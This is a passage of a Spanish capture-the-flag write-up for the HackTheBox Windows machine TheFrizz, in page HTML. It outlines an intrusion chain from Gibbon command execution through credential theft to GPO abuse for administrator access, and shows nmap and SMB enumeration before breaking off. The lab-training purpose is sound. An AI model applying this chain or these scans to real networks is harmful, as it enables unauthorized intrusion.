    var mobileSearchCloseBtnElem = document.querySelector('#search-mobile-close');
    var mobileSearchContainer = document.querySelector('#search-mobile-container');
    var mobileSearchResultsElem = document.querySelector('#search-mobile-results');
    var htmlElem = document.querySelector('html');

    if (mobileSearchClassElem) {
      mobileSearchClassElem.style.display = 'none';
    }

    mobileSearchBtnElem ? 
    mobileSearchBtnElem.addEventListener('click', function () {
      if (mobileSearchContainer) {
        mobileSearchContainer.style.display = 'block';
      }

      if (mobileSearchInputElem) {
        mobileSearchInputElem.focus();
      }

      if (htmlElem) {
        htmlElem.style.overflowY = 'hidden';
      }
    }) : null;

    mobileSearchCloseBtnElem ? 
    mobileSearchCloseBtnElem.addEventListener('click', function() {
      if (mobileSearchContainer) {
        mobileSearchContainer.style.display = 'none';
      }

      if (mobileSearchInputElem) {
        mobileSearchInputElem.value = '';
      }
      
      if (mobileSearchResultsElem) {
        while (mobileSearchResultsElem.firstChild) {
          mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
        }
      }

      if (htmlElem) {
        htmlElem.style.overflowY = 'visible';
      }
    }) : null;

    mobileSearchInputElem ?
    mobileSearchInputElem.addEventListener('keydown', function(e) {
      var keyCode = e.which || e.keyCode;
      if (e.key === 'Escape' || keyCode === 27) {
        if (mobileSearchContainer) {
          mobileSearchContainer.style.display = 'none';
        }
        
        if (mobileSearchInputElem) {
          mobileSearchInputElem.value = '';
        }

        if (mobileSearchResultsElem) {
          while (mobileSearchResultsElem.firstChild) {
            mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
          }
        }
        if (htmlElem) {
          htmlElem.style.overflowY = 'visible';
        }
      }
    }) : null;
  


  
    function renderSearchResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');
      
      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }

    function renderSearchHighlightResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');

      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeHighlightLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }
  
  });
</script>    
    


<link rel="stylesheet" href="/css/main.min.css">



  
  
    
    <link rel="stylesheet" href="/css/custom.min.css">
  


    
<meta name="description" content="TheFrizz corre Gibbon con una version vulnerable que tras un analisis de codigo logramos la ejecucion de comandos. Realizamos Port Forwarding para acceder al puerto de la base de datos y obtener credenciales en esta que permitieron ingresar por SSH mediante Kerberos. Descubrimos una contrasena dentro de un backup para el acceso a un segundo usuario. Este ultimo, pertenece al grupo &#39;Group Policy Creator Owners&#39; por lo que creamos un objeto &#39;vulnerable&#39; para luego con SharpGPOAbuse ejecutar comandos que finalmente nos dio acceso como administrador." />
<meta property="og:description" content="TheFrizz corre Gibbon con una version vulnerable que tras un analisis de codigo logramos la ejecucion de comandos. Realizamos Port Forwarding para acceder al puerto de la base de datos y obtener credenciales en esta que permitieron ingresar por SSH mediante Kerberos. Descubrimos una contrasena dentro de un backup para el acceso a un segundo usuario. Este ultimo, pertenece al grupo &#39;Group Policy Creator Owners&#39; por lo que creamos un objeto &#39;vulnerable&#39; para luego con SharpGPOAbuse ejecutar comandos que finalmente nos dio acceso como administrador." />


<meta name="keywords" content="Gibbonv25,lfi,php,php-fopen,mysql,chisel,netexec,bloodhound-python,impacket-getTGT,ssh-kerberos,backup,wapt,password-spraying,GPO-abuse,evil-GPO,SharpGPOAbuse,mimikatz,hashcat">

<meta name="created" content="2025-08-23T00:00:00&#43;0000">
<meta name="modified" content="2025-08-23T00:00:00&#43;0000">
<meta property="article:published_time" content="2025-08-23T00:00:00&#43;0000">

<meta name="author" content="sckull">
<meta property="article:author" content="https://sckull.github.io/posts/thefrizz/@sckull">



<meta name="twitter:site" content="@sckull_" />



<meta property="og:site_name" content="sckull">
<meta property="og:title" content="HackTheBox - TheFrizz">
<meta property="og:url" content="https://sckull.github.io/posts/thefrizz/">
<meta property="og:type" content="article">
<meta property="og:description" content="TheFrizz corre Gibbon con una version vulnerable que tras un analisis de codigo logramos la ejecucion de comandos. Realizamos Port Forwarding para acceder al puerto de la base de datos y obtener credenciales en esta que permitieron ingresar por SSH mediante Kerberos. Descubrimos una contrasena dentro de un backup para el acceso a un segundo usuario. Este ultimo, pertenece al grupo &#39;Group Policy Creator Owners&#39; por lo que creamos un objeto &#39;vulnerable&#39; para luego con SharpGPOAbuse ejecutar comandos que finalmente nos dio acceso como administrador.">

  
    <meta property="og:image" content="https://sckull.github.io/images/posts/htb/thefrizz/cover.png">
    <meta property="og:image:url" content="https://sckull.github.io/images/posts/htb/thefrizz/cover.png">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:app:name:iphone" content="sckull">
    <meta property="twitter:title" content="HackTheBox - TheFrizz">
    <meta property="twitter:description" content="TheFrizz corre Gibbon con una version vulnerable que tras un analisis de codigo logramos la ejecucion de comandos. Realizamos Port Forwarding para acceder al puerto de la base de datos y obtener credenciales en esta que permitieron ingresar por SSH mediante Kerberos. Descubrimos una contrasena dentro de un backup para el acceso a un segundo usuario. Este ultimo, pertenece al grupo &#39;Group Policy Creator Owners&#39; por lo que creamos un objeto &#39;vulnerable&#39; para luego con SharpGPOAbuse ejecutar comandos que finalmente nos dio acceso como administrador.">
  

<meta name="generator" content="Hugo 0.123.7">
<meta name="msapplication-TileColor" content="#1d1d1d">

<meta name="theme-color" content="#1d1d1d">

<meta name="msapplication-navbutton-color" content="#1d1d1d">

<meta name="apple-mobile-web-app-status-bar-style" content="#1d1d1d">

<link rel="canonical" href="https://sckull.github.io/posts/thefrizz/">



  
  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/favicon.png" sizes="any" type="image/png" />
  


    
<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "BlogPosting",
    "headline": "HackTheBox - TheFrizz",
    "datePublished": "2025-08-23T00:00:00Z",
    "dateModified": "2025-08-23T00:00:00Z",
    "url" : "https://sckull.github.io/posts/thefrizz/",
    "description": "TheFrizz corre Gibbon con una version vulnerable que tras un analisis de codigo logramos la ejecucion de comandos. Realizamos Port Forwarding para acceder al puerto de la base de datos y obtener credenciales en esta que permitieron ingresar por SSH mediante Kerberos. Descubrimos una contrasena dentro de un backup para el acceso a un segundo usuario. Este ultimo, pertenece al grupo 'Group Policy Creator Owners' por lo que creamos un objeto 'vulnerable' para luego con SharpGPOAbuse ejecutar comandos que finalmente nos dio acceso como administrador.",
    "keywords": ["Gibbonv25","lfi","php","php-fopen","mysql","chisel","netexec","bloodhound-python","impacket-getTGT","ssh-kerberos","backup","wapt","password-spraying","GPO-abuse","evil-GPO","SharpGPOAbuse","mimikatz","hashcat"],
    "image" : "https://sckull.github.io/images/posts/htb/thefrizz/cover.png",
    "author": {
      "@type": "Person",
      "name": "sckull"
    },
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://sckull.github.io/"
    },
    "publisher": {
      "@type": "Organization",
      "name": "sckull",
      "url": "https://sckull.github.io/"
    }
  }
</script>
    
  
  







    
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet"> 


<script async src="https://www.googletagmanager.com/gtag/js?id=G-2M568SGK9N"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-2M568SGK9N');
</script>


<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />

</head>

<body id="root" class="theme__dark">
    <script>
        var localTheme = localStorage.getItem('theme');
        if (localTheme) {
            document.getElementById('root').className = 'theme__' + localTheme;
        }
    </script>
    <div id="container">
        





        <div class="wrapper" data-type="posts" data-kind="page">
            <nav class="navbar" role="navigation" aria-label="main navigation" data-dir="ltr">
  <div class="navbar__brand">
    
    &nbsp;&nbsp;
    
    
      <a href="/" title="Home" rel="home" class="navbar__title-link">
        <h6 class="navbar__title">&gt; sckull<span class="logo__cursor"></span> </h6>
      </a>
      
      <a class="navbar__title-link" style="margin-left: 5px;">
        <h6 class="logo__icon">----</h6>
      </a>
      
    
  </div>

  
<div class="theme theme-mobile" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" style="" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          htb
        </a>
        
      
    </div>
  </div>
</div>


<div id="mobileSearchBtn" class="mobile-search__btn" data-ani="true">
  <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
</div>

<div id="search-mobile-container" class="mobile-search hide" data-dir="ltr">
  <div class="mobile-search__top">
    <input id="search-mobile" type="text" aria-label="Mobile Search" placeholder="Buscar" class="mobile-search__top--input"/>
    <div id="search-mobile-close" class="mobile-search__top--icon">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path opacity=".87" fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm3.59-13L12 10.59 8.41 7 7 8.41 10.59 12 7 15.59 8.41 17 12 13.41 15.59 17 17 15.59 13.41 12 17 8.41z"/></svg>
    </div>
  </div>
  <div id="search-mobile-results" class="mobile-search__body">
    
  </div>
</div>


<a role="button" class="navbar__burger" aria-label="menu" aria-expanded="false"
  data-ani="true">
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
</a>
<div class="navbarm__collapse" data-open="false">
  <ul dir="ltr">
    
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/#">
            CTF
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 9.29L12 13.17l3.88-3.88c.39-.39 1.02-.39 1.41 0 .39.39.39 1.02 0 1.41l-4.59 4.59c-.39.39-1.02.39-1.41 0L6.7 10.7c-.39-.39-.39-1.02 0-1.41.39-.38 1.03-.39 1.42 0z"/></svg>
          </a>
        </li>

        
          <li class="navbarm__menu--item navbarm__menu--subitem">
            <a href="/categories/tryhackme">TryHackMe</a>
          </li>
        
          <li class="navbarm__menu--item navbarm__menu--subitem">
            <a href="/categories/hackthebox">HackTheBox</a>
          </li>
        
          <li class="navbarm__menu--item navbarm__menu--subitem">
            <a href="/categories/cyberseclabs">CyberSecLabs</a>
          </li>
        

      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/archive">Archive</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/tags">Tags</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/notes/notes/">Notes</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/about">About</a>
        </li>
      
      
    

    
  </ul>
</div>
  <div class="navbar__menu">
  
<div class="theme" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          htb
        </a>
        
      
    </div>
  </div>
</div>

  
  
  
  
  
  
  
  <div class="navbar__dropdown navbar__slide-down" data-ani="true">
    <a href="/#" class="navbar__menu-item "
      dir="ltr">
      CTF
      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 9.29L12 13.17l3.88-3.88c.39-.39 1.02-.39 1.41 0 .39.39.39 1.02 0 1.41l-4.59 4.59c-.39.39-1.02.39-1.41 0L6.7 10.7c-.39-.39-.39-1.02 0-1.41.39-.38 1.03-.39 1.42 0z"/></svg>
    </a>
    <div class="navbar__dropdown--content">
      
      <a href="/categories/tryhackme" class="navbar__dropdown--item" dir="ltr">TryHackMe</a>
      
      <a href="/categories/hackthebox" class="navbar__dropdown--item" dir="ltr">HackTheBox</a>
      
      <a href="/categories/cyberseclabs" class="navbar__dropdown--item" dir="ltr">CyberSecLabs</a>
      
    </div>
  </div>
  
  
  
  
  
  
  
  <a href="/archive" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Archive</a>
  
  
  
  
  
  
  
  <a href="/tags" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Tags</a>
  
  
  
  
  
  
  
  <a href="/notes/notes/" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Notes</a>
  
  
  
  
  
  
  
  <a href="/about" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">About</a>
  
  
</div>

</nav>
            


            

<main class="single__main main">
  
  
  <div class="single ">
    <div class="single__nojs">This page looks best with JavaScript enabled</div>
    <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
    
    <h2 class="single__title" data-ani="true" id="title__single">HackTheBox - TheFrizz</h2>
    <div class="single__meta">
      
<div class="single__infos">
  <time class="single__info" title="Written At">Aug 23, 2025 </time>
  
  

  

  
  
  &nbsp;â€¢&nbsp; <span class="single__info" title="WRITTEN BY">âœï¸&nbsp;sckull</span>
  
  <span class="single__info">
    
  </span>
</div>

      
<ul class="single__tags caption">
  
  ðŸ·ï¸
  

  <li><a href="https://sckull.github.io/tags/gibbonv25/" class="single__tag" title="Gibbonv25">Gibbonv25</a></li>
  

  <li><a href="https://sckull.github.io/tags/lfi/" class="single__tag" title="Lfi">Lfi</a></li>
  

  <li><a href="https://sckull.github.io/tags/php/" class="single__tag" title="Php">Php</a></li>
  

  <li><a href="https://sckull.github.io/tags/php-fopen/" class="single__tag" title="Php-Fopen">Php-Fopen</a></li>
  

  <li><a href="https://sckull.github.io/tags/mysql/" class="single__tag" title="Mysql">Mysql</a></li>
  

  <li><a href="https://sckull.github.io/tags/chisel/" class="single__tag" title="Chisel">Chisel</a></li>
  

  <li><a href="https://sckull.github.io/tags/netexec/" class="single__tag" title="Netexec">Netexec</a></li>
  

  <li><a href="https://sckull.github.io/tags/bloodhound-python/" class="single__tag" title="Bloodhound-Python">Bloodhound-Python</a></li>
  

  <li><a href="https://sckull.github.io/tags/impacket-gettgt/" class="single__tag" title="Impacket-GetTGT">Impacket-GetTGT</a></li>
  

  <li><a href="https://sckull.github.io/tags/ssh-kerberos/" class="single__tag" title="Ssh-Kerberos">Ssh-Kerberos</a></li>
  

  <li><a href="https://sckull.github.io/tags/backup/" class="single__tag" title="Backup">Backup</a></li>
  

  <li><a href="https://sckull.github.io/tags/wapt/" class="single__tag" title="Wapt">Wapt</a></li>
  

  <li><a href="https://sckull.github.io/tags/password-spraying/" class="single__tag" title="Password-Spraying">Password-Spraying</a></li>
  

  <li><a href="https://sckull.github.io/tags/gpo-abuse/" class="single__tag" title="GPO-Abuse">GPO-Abuse</a></li>
  

  <li><a href="https://sckull.github.io/tags/evil-gpo/" class="single__tag" title="Evil-GPO">Evil-GPO</a></li>
  

  <li><a href="https://sckull.github.io/tags/sharpgpoabuse/" class="single__tag" title="SharpGPOAbuse">SharpGPOAbuse</a></li>
  

  <li><a href="https://sckull.github.io/tags/mimikatz/" class="single__tag" title="Mimikatz">Mimikatz</a></li>
  

  <li><a href="https://sckull.github.io/tags/hashcat/" class="single__tag" title="Hashcat">Hashcat</a></li>
  

</ul>
    </div>
    <article class="single__contents" data-dir="ltr" data-ani="true">
      
      



  



  <div class="featured-image__wrapper">
    <img src="/images/posts/htb/thefrizz/cover.png" alt="featured image" class="featured-image" style="width: ;height: ;">
  </div>

<p>TheFrizz corre Gibbon con una version vulnerable que tras un analisis de codigo logramos la ejecucion de comandos. Realizamos Port Forwarding para acceder al puerto de la base de datos y obtener credenciales en esta que permitieron ingresar por SSH mediante Kerberos. Descubrimos una contrasena dentro de un backup para el acceso a un segundo usuario. Este ultimo, pertenece al grupo &lsquo;Group Policy Creator Owners&rsquo; por lo que creamos un objeto &lsquo;vulnerable&rsquo; para luego con SharpGPOAbuse ejecutar comandos que finalmente nos dio acceso como administrador.</p>
<table>
<thead>
<tr>
<th>Nombre</th>
<th align="center"><a href="https://app.hackthebox.com/machines/652">TheFrizz</a></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>OS</strong></td>
<td align="center"><span><p class="os_type"> Windows <img src="/images/icons/windows.png" class="img_type_os"/></p></span></td>
</tr>
<tr>
<td><strong>Puntos</strong></td>
<td align="center">30</td>
</tr>
<tr>
<td><strong>Dificultad</strong></td>
<td align="center">Medium</td>
</tr>
<tr>
<td><strong>Fecha de Salida</strong></td>
<td align="center">2025-03-15</td>
</tr>
<tr>
<td><strong>IP</strong></td>
<td align="center">10.10.11.60</td>
</tr>
<tr>
<td><strong>Maker</strong></td>
<td align="center"><span><p class="user_maker"> <a href="https://www.hackthebox.eu/home/users/profile/926415">0xPizzaCat</a><img src="https://www.hackthebox.eu/badge/image/926415" class="img_user_maker"/> </p></span></td>
</tr>
<tr>
<td>
<a href="#" class="button" style="width: 72px; height: 30px; pointer-events: none;"  data-color="default" target="_blank" rel="noreferrer">
  <span class="button__text">
    Rated
  </span>
</a></td>
<td align="center"><div class="box"><pre tabindex="0"><code class="language-chart" data-lang="chart">{
    &#34;type&#34;: &#34;bar&#34;,
    &#34;data&#34;:  {
        &#34;labels&#34;: [&#34;Cake&#34;, &#34;VeryEasy&#34;, &#34;Easy&#34;, &#34;TooEasy&#34;, &#34;Medium&#34;, &#34;BitHard&#34;,&#34;Hard&#34;,&#34;TooHard&#34;,&#34;ExHard&#34;,&#34;BrainFuck&#34;],
        &#34;datasets&#34;: [{
            &#34;label&#34;: &#34;User Rated Difficulty&#34;,
            &#34;data&#34;: [98, 53, 190, 533, 880, 721, 581, 248, 64, 165],
            &#34;backgroundColor&#34;: [&#34;#9fef00&#34;,&#34;#9fef00&#34;,&#34;#9fef00&#34;, &#34;#ffaf00&#34;,&#34;#ffaf00&#34;,&#34;#ffaf00&#34;,&#34;#ffaf00&#34;, &#34;#ff3e3e&#34;,&#34;#ff3e3e&#34;,&#34;#ff3e3e&#34;]
        }]
    },
    &#34;options&#34;: {
        &#34;scales&#34;: {
          &#34;xAxes&#34;: [{&#34;display&#34;: false}],
          &#34;yAxes&#34;: [{&#34;display&#34;: false}]
        },
        &#34;legend&#34;: {&#34;labels&#34;: {&#34;fontColor&#34;: &#34;white&#34;}},
        &#34;responsive&#34;: true
      }
}
</code></pre></div></td>
</tr>
</tbody>
</table>
<h1 id="recon">Recon</h1>
<h2 id="nmap">nmap</h2>
<p><code>nmap</code> muestra multiples puertos abiertos: SSH (22), DNS (53), HTTP (80), Kerberos (88), MSRPC (135), SMB (139, 445), LDAP (389, 3268).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.95 scan initiated Tue Mar 18 19:14:57 2025 as: /usr/lib/nmap/nmap --privileged -p22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49667,49670,52878,52882,52893 -sV -sC -oN nmap_scan 10.10.11.60</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.60
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.24s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">22/tcp    open  ssh           OpenSSH for_Windows_9.5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">53/tcp    open  domain        <span class="o">(</span>generic dns response: SERVFAIL<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS-SD-TCP: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     _services
</span></span><span class="line"><span class="cl"><span class="p">|</span>     _dns-sd
</span></span><span class="line"><span class="cl"><span class="p">|</span>     _udp
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    <span class="nb">local</span>
</span></span><span class="line"><span class="cl">80/tcp    open  http          Apache httpd 2.4.58 <span class="o">(</span>OpenSSL/3.1.3 PHP/8.2.12<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.58 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/3.1.3 PHP/8.2.12
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-03-19 06:15:04Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: frizz.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: frizz.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">52878/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">52882/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">52893/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port53-TCP:V<span class="o">=</span>7.95%I<span class="o">=</span>7%D<span class="o">=</span>3/18%Time<span class="o">=</span>67D9FE87%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNS-
</span></span><span class="line"><span class="cl">SF:SD-TCP,30,<span class="s2">&#34;\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:_udp\x05local\0\0\x0c\0\x01&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">Service Info: Hosts: localhost, FRIZZDC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-03-19T06:15:57
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 6h59m59s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Tue Mar 18 19:16:42 2025 -- 1 IP address (1 host up) scanned in 105.29 seconds</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="smb">SMB</h2>
<p>Samba parece no aceptar solicitudes.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ smbclient -L <span class="se">\\</span>10.10.11.60
</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_NOT_SUPPORTED
</span></span><span class="line"><span class="cl">â¯ 
</span></span><span class="line"><span class="cl">â¯ smbmap -H 10.10.11.60
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>...<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Detected <span class="m">1</span> hosts serving SMB                                                                                                  
